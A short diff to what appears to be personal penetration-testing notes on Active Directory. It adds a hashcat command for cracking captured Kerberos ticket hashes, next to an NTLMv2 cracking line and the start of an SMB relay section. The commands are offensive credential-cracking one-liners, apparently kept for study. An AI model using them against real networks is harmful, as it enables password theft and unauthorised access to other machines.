@@ -19,6 +19,11 @@ Cracking Captured HASH
 
 2. sudo hashcat -m 5600 hash.txt  .usr/share/wordlist/rocku.txt --force           // 5600 - NTLMv2 hash 
 
+=> cracking kerberos hash
+----------------------------------------
+#hashcat -m 13100 kerberosHash.txt /usr/share/wordlists/ rockyou.txt --force
+----------------------------------------------------------------------------
+
 SMB Relay
 --------------------------------------------------------
 Use the hash cpatured from the responder to gain access to other machines instead of cracking the hash.Howerver there are two requirements for successfull execution of this attack.
